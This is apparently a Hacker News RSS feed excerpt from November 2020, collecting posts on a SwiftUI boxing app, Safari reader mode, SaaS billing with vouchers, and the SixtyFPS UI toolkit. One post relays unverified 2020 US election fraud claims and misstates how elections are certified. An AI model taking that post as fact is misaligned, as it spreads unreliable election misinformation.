<li>A way to give audio cues, ideally a synthesized voice so I don’t have to constantly look at my phone</li> <li>Needs to work for me, meaning running on iOS since I have an iPhone</li> </ul> <h3 id="building-with-swiftui">Building with SwiftUI</h3> <h4 id="why-pick-swiftui">Why Pick SwiftUI?</h4> <p>Since I have an iPhone, I had to build something running on it. I could have created a web version, but since the experience was going to be inherently mobile I wanted to start on the right platform and actually have he app installed on my phone.</p> <p>In the past I’ve tried many options as alternative to purely native development: <a href="https://marcgg.com/blog/2012/10/22/custom-slider-ios-rubymotion/">in 2012 I worked with RubyMotion</a>, in 2013 I’ve experimented with <a href="https://marcgg.com/blog/2013/08/29/appgyver-steroids-iphone-hybrid-javascript/">Steroids.js</a>, in 2014 <a href="https://marcgg.com/blog/2014/04/09/phonegap-steroids-hybrid-native-app-tips/">PhoneGap</a> and even <a href="https://marcgg.com/blog/2014/05/06/quantified-self-iphone-app-track-mood-day/">released an app with these alternative technologies</a>… however I always had the same issues with this approach. You end up fighting the framework, the phone and the ecosystem. Some things are missing, performances can be degraded and you have to do a lot of extra work to build what native developers get for free.</p> <p>Technologies like <a href="https://flutter.dev/">Flutter</a> have the promise of multi platform, but from my experience you still have to know the quirks of iOS and Android if you want to build an app that goes beyond a basic use case… so this means that not only you have to learn Flutter &amp; Dart, but you also have to learn some Swift, a bit of Kotlin and the iOS and Android SDKs. It might improve in the future but, in my opinion and as things are today, going native is still the better approach to get a great mobile experience.</p> <p>The annoying part was that I tried working with UIKit in the past and really didn’t enjoy it… but this is where SwiftUI comes in!</p> <p><img src="https://marcgg.com/assets/blog/swift/swift_logo.png" alt="Swift and SwiftUI logo"></p> <blockquote> <p>SwiftUI is a user interface toolkit that lets us design apps in a declarative way. That’s a fancy way of saying that we tell SwiftUI how we want our UI to look and work, and it figures out how to make that happen as the user interacts with it.</p> <p><a href="https://twitter.com/twostraws">@twostraws</a> on <a href="https://www.hackingwithswift.com/quick-start/swiftui/what-is-swiftui">Hacking with Swift</a></p> </blockquote> <p>I had my eyes on this technology ever since it came out because I always was allergic to UIKit’s way of building app and this declarative approach felt like what iOS needed. It was also an easy to grab paradigm for me thanks to my experience with ReactJS.</p> <p>Since I was lucky to work on a greenfield project, and therefore didn’t have to keep previous users in mind, I could pick this framework even if it was only compatible with iOS 13 and up.</p> <h4 id="learning-swiftui">Learning SwiftUI</h4> <p>Overall SwiftUI felt incredibly simple to understand and work with. Using <a href="https://developer.apple.com/tutorials/swiftui/">Apple’s documentation</a> and the amazing videos and articles of <a href="https://www.hackingwithswift.com/">Hacking With Swift</a>, I managed to build a very basic UI and have it on Testflight in less than 20 hours of work.</p> <p>I really can’t understate how easy it was for me to get into it. That’s really from 0 to a basic app in a couple of days.</p> <ul> <li>Swift felt very natural, and beyond a couple of quirks it was very straightforward.</li> <li>SwiftUI was also very easy to grasp, and thinking in components felt logical to me. The preview panel makes testing out things easy, and there are many very well made tutorials out there. Again, I can’t recommend <a href="https://www.hackingwithswift.com/">Hacking With Swift</a> enough.</li> </ul> <p>I was expecting to enjoy the technology, but I can honnestly say that it was a game changer to me. Even if it still has significant limitations that only appeared way later in development, I felt productive and in control.</p> <h3 id="first-version">First Version</h3> <p>After approximatively 40 hours of work, I had a workout generator, a landing screen with simple explanations and a start button leading to a form for customizing parts of the algorithm. Fun fact, all this time I was train every day using the algorithm, and sometime ending up dead tired because it wasn’t tweaked properly!</p> <p><img src="https://marcgg.com/assets/blog/swift/mvp_1.png" alt="Boxing app MVP"></p> <p>Once the training started, a timer screen would show with two different mode: fighting and active recovery. The two screens have different colors so I could be able to see from afar what is going on if I missed an audio cue. If you wonder how I built the clock section, I wrote <a href="https://marcgg.com/blog/2020/05/06/circular-progressbar-clock-swiftui/">an article on this</a>.</p> <p><img src="https://marcgg.com/assets/blog/swift/mvp_2.png" alt="Boxing app MVP"></p> <h3 id="making-the-mvp-actually-viable">Making the MVP Actually Viable</h3> <h4 id="adding-a-workout-abstraction">Adding a Workout Abstraction</h4> <p>This first version of the MVP showed me that it was indeed a useful app that I enjoyed training with. However after showing it to multiple people, it was also very clear that no one understood the customization form and what was the point of the app. To me, the cool thing with the whole thing was the algorithm, but I had to admit that it needed some kind of abstraction to present it to users.</p> <p>To do that I went ahead and built “workouts “by setting some parameters for the algorithm in advance. For instance:</p> <ul> <li>12 rounds of 3 minutes, only freestyle, 1 minute rest: this looks a lot like a normal boxing match!</li> <li>20 rounds of 1 minute, mostly intense combos with 30 seconds of active recovery: this is close to a high intensity interval workout session.</li> </ul> <p>Once this was figured out I added some text explaining what the training was and a photo to illustrate it.</p> <h4 id="discoverability-of-the-algorithm">Discoverability of the Algorithm</h4> <p>I still wanted people to build their own workouts once they used the pre-made ones for a while. So I still had a way to access the massive customization form, and I made sure that people could see the various parameters used in the workout. This would ideally get them inspired to try it themselves.</p> <h4 id="learning-design">Learning Design</h4> <p>I’ve made it very clear in the past: <a href="https://marcgg.com/blog/2014/04/28/frame-based-layout-bad-code/">I’m pretty bad at design</a>. I usually say that I’m just good enough to know that what I’m doing looks bad, which is depressing.</p> <p>For <a href="https://marcgg.com/blog/2014/05/06/quantified-self-iphone-app-track-mood-day/">my previous app</a> I had teamed up with a designer, but this time I wanted to do it on my own… but I still wanted to ship something that looked decent, and the first version with the weird orange “get started” button was everything but decent. To improve it, I decided to go through all the fitness apps I could find, watch app design videos, browse pinterest &amp; dribbble to finally be able draft something better. I also figured now would be the right time to learn how to properly use <a href="http://figma.com/">Figma</a>.</p> <p>After a few days of this and hating my life, I managed to have something that didn’t look like an abonation. What helped me getting there was:</p> <ul> <li>Leaning into Apple’s guidelines a lot with SF Icons, system fonts, padding recommendations and so on.</li> <li>Using ressources like <a href="https://coolors.co/palettes/trending">color palettes</a> and <a href="https://www.flaticon.com/">flaticon</a></li> <li>Relying on <a href="https://www.pexels.com/">stock photography</a>, as it worked well with the fitness space</li> </ul> <h4 id="improving-the-app-icon">Improving the App Icon</h4> <p>The first app icon was quickly made and didn’t feel right. After some browsing I found a stock …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://marcgg.com/blog/2020/11/12/building-boxing-mobile-app-swiftui/">https://marcgg.com/blog/2020/11/12/building-boxing-mobile-app-swiftui/</a></em></p>]]>
            </description>
            <link>https://marcgg.com/blog/2020/11/12/building-boxing-mobile-app-swiftui/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069237</guid>
            <pubDate>Thu, 12 Nov 2020 12:48:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Public Safety Announcement: The 2020 Election Is Not Over]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069181">thread link</a>) | @lettergram
<br/>
November 12, 2020 | https://austingwalters.com/public-safety-announcement-the-2020-election-is-not-over-as-of-nov-11-2020/ | <a href="https://web.archive.org/web/*/https://austingwalters.com/public-safety-announcement-the-2020-election-is-not-over-as-of-nov-11-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3754">

<div>
<p>I have been listening to my friends and family and am concerned that many are not aware of the election process. Having the presidential election flip from Democrat to Republican at this point can cause massive rioting, violence, etc.</p>
<p>We should all be aware of the current situation and the news outlets do not appear to be informing people.</p>
<blockquote><p><strong>Disclaimer</strong>: I’m am not pro-democrat or pro-republican. Personally, I believe neither party is fit to run the country.</p></blockquote>
<p>I wanted to share what appears to be the Republican strategy and why it’s possible (though still unlikely) Trump could win.</p>
<p>At time of writing Trump the betting markets have <a href="https://electionbettingodds.com/4hr.html" target="_blank" rel="noopener noreferrer">13% odds of winning the election</a> (odds calculated average from <a href="https://www.betfair.com/exchange/plus/politics">Betfair</a> and <a href="https://www.predictit.org/promo/electionbetting">PredictIt</a>).</p>
<p><a href="https://www.predictit.org/markets/detail/3698/Who-will-win-the-2020-US-presidential-election" target="_blank" rel="noopener noreferrer">PredictIt</a> currently has 16% odds of Trump winning:</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png" alt="" width="500" height="344" srcset="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png 666w, https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12-300x206.png 300w" sizes="(max-width: 500px) 100vw, 500px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png 666w, https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12-300x206.png 300w"></a></p>
<h3>Biden is not Officially the President-Elect</h3>
<p>The president elect is determined by the electoral college or the General Services Administration (aka Trump conceding). That did not occur.</p>
<p>This is not uncommon, from <a href="https://en.wikipedia.org/wiki/President-elect_of_the_United_States" target="_blank" rel="noopener noreferrer">wikipedia</a>:</p>
<blockquote><p>The closest instance of there being no qualified person to take the presidential oath of office on Inauguration Day happened in 1877 when the disputed election between Rutherford B. Hayes and Samuel J. Tilden was decided and certified in Hayes’ favor just three days before the inauguration (then March 4).</p></blockquote>
<h3>Evidence, Pending Review</h3>
<p>It takes time to build evidence. Last night on <a href="https://www.youtube.com/watch?v=7WzYTSwt18k" target="_blank" rel="noopener noreferrer">Fox News (Hannity, 11/10/2020)</a> the Republicans discussed some of the election (video may be removed, not on Fox News website).</p>
<p>The Republicans claim 11,000+ incident reports of vote manipulation, currently being vetted by attorneys. 250+ affidavits already signed, many have corroborating physical evidence, photos or additional witnesses (unclear how much). In a section below, some specific claims are covered.</p>
<h3>The Voting Recount Process</h3>
<ol>
<li>Affidavit is necessary to challenge some ballots</li>
<li>After canvassing, Republicans can request a recount</li>
<li>A judges in each county can review evidence (aka affidavits, photos, etc)</li>
<li>The judge can remove ballots (at random) based on evidence</li>
<li>Judgements can be challenged to a higher court</li>
<li>Recount occurs after ballots removed</li>
<li>IF it’s so wide spread or there’s a major error. The house or senate decide (or special elections), it depends on the State.</li>
<li>Electors vote on to December 14 and delivered December 23rd [<a href="https://crsreports.congress.gov/product/pdf/IF/IF11641">1</a>]</li>
</ol>
<h4>State Government Affiliation(s)</h4>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Pennsylvania_General_Assembly" target="_blank" rel="noopener noreferrer">PA</a>, <a href="https://en.wikipedia.org/wiki/Michigan_Legislature" target="_blank" rel="noopener noreferrer">MI</a>, <a href="https://en.wikipedia.org/wiki/Wisconsin_Legislature" target="_blank" rel="noopener noreferrer">WI</a> and <a href="https://en.wikipedia.org/wiki/Georgia_General_Assembly" target="_blank" rel="noopener noreferrer">GA</a> have a fairly large republican majority of both houses</li>
<li><a href="https://en.wikipedia.org/wiki/Arizona_State_Legislature" target="_blank" rel="noopener noreferrer">AZ</a> has a slight republican majority of both houses</li>
<li><a href="https://en.wikipedia.org/wiki/Nevada_Legislature" target="_blank" rel="noopener noreferrer">NV</a> has a large Democrat majority in both houses</li>
</ul>
<p>It’s also still possible the United States Supreme Court could still toss hundreds of thousands of ballots out of PA (Biden’s up by 40k)[<a href="https://www.washingtonexaminer.com/news/republican-state-attorneys-general-ask-supreme-court-to-take-up-pennsylvania-late-mail-in-ballot-case" target="_blank" rel="noopener noreferrer">2</a>].</p>
<h3>Affidavit Claims</h3>
<p>Selected claims on Fox / Hannity (on 11/10/2020):</p>
<p>1. There was a “software bug” in one jurisdiction, the exact same software was used in half of Michigan and multiple states. Only the one county noted the fix. They want to re-evaluate and manually recount in said counties. Code reviews requested.</p>
<p>2. Pennsylvania USPS (more than one) said the postal service was backdating ballots AND collecting ballots after the date (prior to back dating, i.e. they knew)</p>
<p>3. Michigan had a lot of dead people vote &gt;50 for one county, thus far that they’ve found.</p>
<p>4. All the states have laws enabling the voting process to be accessible to the public, due to COVID-19 they limited public observers, particularly from independents. Legal challenges can occur, as that is against many states laws.</p>
<p>5. Democrat poll watchers were handing out pamphlets on “how to distract GOP poll watchers”</p>
<p>6. Poll watchers claim to have seen ballots with the same or no signatures be counted in Michigan</p>
<h3>Personal Opinion</h3>
<p>Personally, I believe this is the correct course of action. I’m not sure I believe all the claims.</p>
<p>However, I think it’s very important we challenge the votes, see where it falls and improve the Republic. Even if we do it after the election, it’s important we identify fraud and / or improve the process so this doesn’t happen again.</p>
<p>Unfortunately, the news media is not presenting this very well. I am concerned this will lead to a civil war. The Democratic party knows they are not officially the president elect, yet hold press conferences, that look like this…</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2020/11/president-elect.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/11/president-elect-1024x685.png" alt="" width="792" height="530" srcset="https://austingwalters.com/wp-content/uploads/2020/11/president-elect-1024x685.png 1024w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect-300x201.png 300w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect-768x514.png 768w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect.png 1514w" sizes="(max-width: 792px) 100vw, 792px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/11/president-elect-1024x685.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/11/president-elect-1024x685.png 1024w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect-300x201.png 300w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect-768x514.png 768w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect.png 1514w"></a>I’m not convinced this wont lead to violence. I’m concerned because it looks like <em>if the Democrats lose the election.</em> There will be a rival government setup. Several <a href="https://www.cnn.com/2020/11/07/americas/biden-global-reaction-election-intl/index.html" target="_blank" rel="noopener noreferrer">foreign powers have already acknowledged Biden as the victor</a>, for instance.</p>
<p>Personally, I just want a safe environment for my friends and family. I think most of us do.</p>

</div>

</article></div>]]>
            </description>
            <link>https://austingwalters.com/public-safety-announcement-the-2020-election-is-not-over-as-of-nov-11-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069181</guid>
            <pubDate>Thu, 12 Nov 2020 12:41:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Open Letter to Safari]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069172">thread link</a>) | @z3t4
<br/>
November 12, 2020 | https://xn--zta-qla.com/en/blog/safari_vs_semantics.htm | <a href="https://web.archive.org/web/*/https://xn--zta-qla.com/en/blog/safari_vs_semantics.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>



<p>Hello Safari team!</p>

<p>My name is Johan, and I work as a web developer.</p>

<p>I like semantic HTML elements and when creating web sites I try to avoid div's.</p>

<p>The reason why I prefer semantic elements is that they make editing easier.<br>
I have a vision that ordinary people should be able to write documents for the web!</p>

<!--
<p>Even though the web have existed for over 30 years, it's still the best way to share documents,
not only can you share documents, you can make *interactive* documents, and link to <i>other</i> documents.
Heck you can even share a "document" that is a full fledged application (web app).
The web is still lightyears ahead of Execl and Word, yet there are more people writing in Excel and Word then there are people writing web pages/documents ...</p>
-->

<h2>Web development</h2>

<p>It's my job as a web developer to make these "documents" easily accessible.<br>
And with accessible I mean it should not only be accessible by people with different forms of blindness,
it should be accessible for editing too. 
And one thing that helps with accessibility is semantic elements:
Instead of using div elements and CSS class names as markup, I try to use semantic elements and as little CSS classes as possible.
This makes the web pages more accessible for everyone.<br>
There is only one problem though:</p>

<h2>Safari Reader mode</h2>

<p>I work with a good designer that can make very beautiful "documents" (web pages).
But if I use semantic elements like &lt;section&gt; Safari will automatically put the page in "reader mode", 
which means all design goes "poof" and the layout is mangled.<br>
And the only way to avoid "reader mode" in Safari is to <i>not use semantic elements</i>.<br>
So please Safari - let me use semantic HTML elements - and let users enjoy the beautiful design.</p>

<!-- *kommentera-mera* -->

<hr>

<p>Written by  November 11th, 2020.</p>


</div></div>]]>
            </description>
            <link>https://xn--zta-qla.com/en/blog/safari_vs_semantics.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069172</guid>
            <pubDate>Thu, 12 Nov 2020 12:40:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Best way to do billing for a SaaS MVP]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069132">thread link</a>) | @nrthrn
<br/>
November 12, 2020 | https://voucherly.app/best-mvp-billing-system-for-saas/ | <a href="https://web.archive.org/web/*/https://voucherly.app/best-mvp-billing-system-for-saas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-elementor-type="wp-page" data-elementor-id="126" data-elementor-settings="[]">
						<div>
							<div>
							<section data-id="4143da05" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;gradient&quot;,&quot;shape_divider_bottom&quot;:&quot;clouds&quot;,&quot;shape_divider_bottom_negative&quot;:&quot;yes&quot;}">
							
						
					<div>
							<div>
					<div data-id="2e20b508" data-element_type="column">
			<div>
							<div>
						<div data-id="bfc7933" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><img width="300" height="150" src="https://voucherly.app/wp-content/uploads/2020/10/Voucherly-Logo-1.png" alt="" loading="lazy">											</p>
				</div>
				</div>
				<div data-id="6f6d3033" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>How to setup the best billing system for a SaaS product MVP.​</h2>		</p>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section data-id="49dee567" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
							<div>
					<div data-id="1b805f10" data-element_type="column">
			<div>
							<div>
						<div data-id="66fd27ce" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>When starting with the early version or MVP of your SaaS product, setting up the right user management and billing system that offers the most flexibility for the cheapest dollar is key. This is a guide on recommendations built on trial and error and experience on the best billing flow and requirements for the MVP of a SaaS product.&nbsp;<span>These recommendations do expect you either have a “plan based” or “freemium” model for your SaaS product.</span></p></div>
				</div>
				</div>
				<div data-id="5f92ac4c" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>Here is what you need from your MVP’s billing system:</p><ol><li><p>Handling automatic billing for a monthly subscription (or one time, depending on your app model).</p></li><li><p>The ability to easily change and adapt your packages, so you can test pricing and packaging.</p></li><li><p>Finally, the ability to participate in other acquisition methods: giveaways, bundles, annual contracts or app marketplaces.</p></li></ol></div>
				</div>
				</div>
				<div data-id="0013a71" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Before we dive into the different methods. Please know that this is built from my experience and my investment dollars. I have built multiple SaaS ventures over the years, and have made many mistakes around that billing process. I have made it too complex and never got the value out of the added complexity (one of my ventures was for parents of school children, later pivoted to school boards); and I have also made the mistake of too simple, and then stuck without any flexibility (such as need 2 and 3 above).</span></p></div>
				</div>
				</div>
				
				<div data-id="4dfbb32" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>1. Stripe Only (or similar payment processor)</h2>		</p>
				</div>
				<div data-id="903f28f" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Using only Stripe as your payment middleman means that every new account creation will need to go through the subscription step on your platform. It is the simplest, but suddenly you will find yourself without the flexibility to “give away” an account to a reviewer or beta tester, and also lack the ability to handle acquisition channels like the marketplaces and giveaways mentioned. Lastly, in beta testing, you will be limited to paid beta tests, which is not ideal for many applications and services.</span></p></div>
				</div>
				</div>
				<div data-id="80d9ee6" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>2. Stripe and discount codes</h2>		</p>
				</div>
				<div data-id="46a9fb5" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>One of the e-commerce inspired workarounds is to continue to use Stripe but add discount codes. One of the main challenges in discount codes (vs vouchers), is that 1-to-many vs 1-to-1 relationship. You can drop a discount code into a Reddit post and suddenly are need to now manage multiple discount codes and tracking where/how/who they are being used. I am sure you have googled the web for discount codes or relied on Honey to find cheap things before! Ideally you do not open yourself to this challenge just yet.</span></p><p>Another problem with discount codes is that the 3rd need above (those alternate acquisition channels) need to have that 1-to-1 experience, and therefore will not accept discount codes. You have gained a way to test pricing and packaging, but also opened up some challenges.</p></div>
				</div>
				</div>
				<div data-id="f8d4400" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>3. Stripe, manual account creation, and vouchers.</h2>		</p>
				</div>
				<div data-id="01fe8d8" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Manual account creation is probably throwing you through a loop, why have that and Stripe? The answer is quite simple here. Stripe is providing your automation, creating and handling the billing for customers that are entering through the main channel of your application. However if you have the ability to create a customer on the backend, which bypasses Stripe, you open yourself up to a lot of flexibility.</span></p><p>Here are some examples of accounts I would manually create:</p><ul><li><p>Testing accounts for trying out the flow or bug hunting.</p></li><li><p>An “ideal account” one that is fully setup as an ideal customer would. This is your “stage” for screenshots, video clips, and demonstrating the platform.</p></li><li><p>Creating an account for someone to access and use the platform for free: often people giving feedback, app reviewers, friends, investors, etc.</p></li><li><p>Annual contracts: If someone would rather pay annually or quarterly, I would create their account and then handle billing in Quickbooks or Freshbooks.</p></li><li><p>Participate in marketplaces, bundles, giveaways and other systems.</p></li><li><p>Betas and early adopter participation.</p></li></ul><p>For some of those manually created accounts, having a voucher system is key. I mentioned before the important of using vouchers versus discount codes, but let’s focus on the MVP way to do this. If you have manual account creation, you can pre-create a number of accounts that bypass Stripe, which you will use for different needs. Assigning a voucher code to each username/password and uploading to Voucherly allows you to then sell on marketplaces, launch a giveaway, participate in a software bundle, resellers, or even betas. How it works is that Voucherly takes over the role of getting the new users information, sending the new account credentials and ensure the voucher codes are valid. It is a thousand times cheaper that building it into your MVP, and a requirement for many of those acquisition channels.</p></div>
				</div>
				</div>
				<div data-id="04e656a" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>To wrap it all up,<strong> your ideal MVP platform flow should be the third option.</strong></p><p>It gives the highest level of flexibility with minimal effort. With the voucher system being outside of the application and no-code, it cuts down on the development time and complexity, and the manual account creation gives you flexibility to try different acquisition channels.</p><p>To help you get started we have put together a template of billing system requirements that you can use for your own SaaS product. To get access, join the Voucherly waitlist.</p></div>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section data-id="92f9168" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;shape_divider_top&quot;:&quot;wave-brush&quot;}">
					
					<div>
							<div>
					<div data-id="6ba8b6d5" data-element_type="column">
			<div>
							<div>
						
				
				<div data-id="180a1eb5" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>Any doubt? Or want to jump to the top on the waitlist?</p><p><span><a href="mailto:tyler@nrthrn.io">Contact us</a></span></p></div>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
						</div>
						</div>
					</div></div>]]>
            </description>
            <link>https://voucherly.app/best-mvp-billing-system-for-saas/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069132</guid>
            <pubDate>Thu, 12 Nov 2020 12:34:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SixtyFPS]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069043">thread link</a>) | @ogoffart
<br/>
November 12, 2020 | https://sixtyfps.io/blog/introducing-sixtyfps.html | <a href="https://web.archive.org/web/*/https://sixtyfps.io/blog/introducing-sixtyfps.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        
    <section>
        <div>

    
    <h5>Posted on November 10, 2020</h5>
    

  <p>We’re Olivier &amp; Simon - two enthusiastic software engineers who enjoy developing software for product
    teams. Today we’d like to introduce you to our new venture.</p>
  <h3 id="what-is-sixtyfps">What is SixtyFPS?</h3>

  <p><strong>A fresh, new graphical toolkit for desktop apps and embedded devices</strong></p>
  <p>
    We're building a product to make UI development faster and easier, no matter what programming language, platform, or
    form-factor. Our toolkit consists of the following key components:
  </p><ul>
    <li>A design-friendly <span>markup language</span> for UI elements</li>
    <li>A run-time library with <span>APIs in C++, Rust and JavaScript</span></li>
    <li>An optimizing <span>compiler</span> to compile designs to native C++/Rust
    </li>
  </ul>

  

  <h3 id="express-user-interface-constraints-and-relations">Express user interface constraints and
    relations</h3>
  <p>Designing a user interface starts with primitive graphical elements, such as shapes or images. The design you
    envision requires placing these elements on a display surface, based on a coordinate system, to produce a visual
    hierarchy. We use our <code>.60</code> markup language to define these elements, where and how they are placed,
    and
    how they exchange data. Let’s have a look at an example:</p>
  
  <div>
    <div>
      <div>
        <p>Code</p>
        <hr>
        <p><img src="https://sixtyfps.io/blog/introducing-sixtyfps/hello_world.png" alt="Hello World Example">
      </p></div>
      <div>
        <p>Screenshot</p>
        <hr>
        <p><img src="https://sixtyfps.io/blog/introducing-sixtyfps/hello_world_screenshot.png" alt="Hello World Screenshot">
      </p></div>
    </div>

  </div>
  <p>This snippet of code describes a rectangle and a text element that render a button. It looks like a blend of
    <code>JSON</code> and <code>CSS</code>, which is intentional. We took the structural aspect of <code>JSON</code>,
    added the nice aspects of <code>CSS</code>, such as numbers with absolute or relative lengths, named colors, and
    layouts. We also added an automatic property binding system.</p>
  <p>There’s a lot more to unpack here. Our constantly-evolving <a href="https://github.com/sixtyfpsui/sixtyfps/blob/master/docs/langref.md">markup language reference
      documentation</a> is a good starting point for a deeper dive. You can also play with the example above in our
    <a href="https://sixtyfps.io/editor/?load_url=https://sixtyfps.io/blog/introducing-sixtyfps/hello_world.60">experimental
      online editor</a>.</p>
  <h3 id="performance">Performance</h3>
  <figure>
    <a href="https://www.sixtyfps.io/demos/printerdemo">
      <img src="https://sixtyfps.io/resources/printerdemo_screenshot.png" alt="Screenshot of Printer Demo">
      <figcaption>Screenshot of the printer demo</figcaption>
    </a>
  </figure>
  <p>As chipsets become faster and RAM becomes cheaper, the scale at which computing devices are produced for our
    appliances grows. In our experience, software that uses less CPU and memory will always have an edge. An optimized
    software stack means that save money on the per-unit hardware cost.</p>
  <p>We are committed to providing that edge through:</p>
  <ul>
    <li>Our <code>.60</code> markup compiler generates a carefully designed memory layout. All the components and
      properties are in one flat memory allocation that is compact and requires minimal <code>malloc</code> calls.
    </li>
    <li>Our lightweight property system evaluates binding expressions lazily.</li>
    <li>Our rendered uses GPU acceleration by default.</li>
  </ul>
  <p>Check out our <a href="https://sixtyfps.io/#demos">demos online</a> to get a feeling for how smooth UIs can
    be,
    even when compiled to run in a web browser simulation.</p>
  <h3 id="integrate-into-different-languages">Integrate into different languages</h3>
  <p>One particular aspect of software development that we enjoy is the diverse landscape. Different teams use
    different
    programming languages, with their unique constraints and talent pools. We embrace this diversity and believe that
    a
    good UI toolkit should support this by making every language feel as if it’s the native toolkit. It’s crucial to
    provide idiomatic APIs, so that teams can feel right at home. We do this by making sure that:</p>
  <ol type="1">
    <li>Our C++ integration uses modern C++ 17 and comes with built-in CMake support.</li>
    <li>For Rust developers, we offer a convenient crate, <code>build.rs</code> integration, and even a proc-macro.
    </li>
    <li>Our NodeJS integration is available via <code>npm</code> and allows you to write signal handlers in JavaScript
      and
      even provide custom data models.</li>
  </ol>
  <p>Check out our <a href="https://sixtyfps.io/#tryout">API documentation for the different languages</a>.</p>
  <p>We choose to first support this set of langages because it is the implementation language, another low level
    language, and a dynamic language.
    We believe that it will be easy to extend the integration into more programming languages later.</p>

  <h2 id="whats-next">What’s next?</h2>
  <p>Our project is still in an alpha state. We would love to get your feedback; give it a try. You can provide feedback
    or join our discussions on <a href="https://github.com/sixtyfpsui/sixtyfps">our
      GitHub</a> site.</p>
  <p>In the next few months we're looking forward to completing an off-the-shelf version 1.0. SixtyFPS
    in its current shape is a highly customizable, compelling starting point for new UI product developments and
    prototypes.</p>
  <p>We're be happy to engage in contracting work to explore custom UI development projects with
    SixtyFPS.
  </p>
  <p>Get in touch with us via <a href="mailto:info@sixtyfps.io">email</a>.</p>


    </div>
</section>

    


    </div></div>]]>
            </description>
            <link>https://sixtyfps.io/blog/introducing-sixtyfps.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069043</guid>
            <pubDate>Thu, 12 Nov 2020 12:23:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Seven Reasons for Having a Personal Website]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069035">thread link</a>) | @sT370ma2
<br/>
November 12, 2020 | https://cheapskatesguide.org/articles/why-have-a-personal-website.html | <a href="https://web.archive.org/web/*/https://cheapskatesguide.org/articles/why-have-a-personal-website.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://cheapskatesguide.org/articles/why-have-a-personal-website.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069035</guid>
            <pubDate>Thu, 12 Nov 2020 12:21:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Power of Serverless GraphQL with AWS AppSync]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069006">thread link</a>) | @slobodan_
<br/>
November 12, 2020 | https://serverless.pub/the-power-of-serverless-graphql-with-appsync/ | <a href="https://web.archive.org/web/*/https://serverless.pub/the-power-of-serverless-graphql-with-appsync/">archive.org</a>
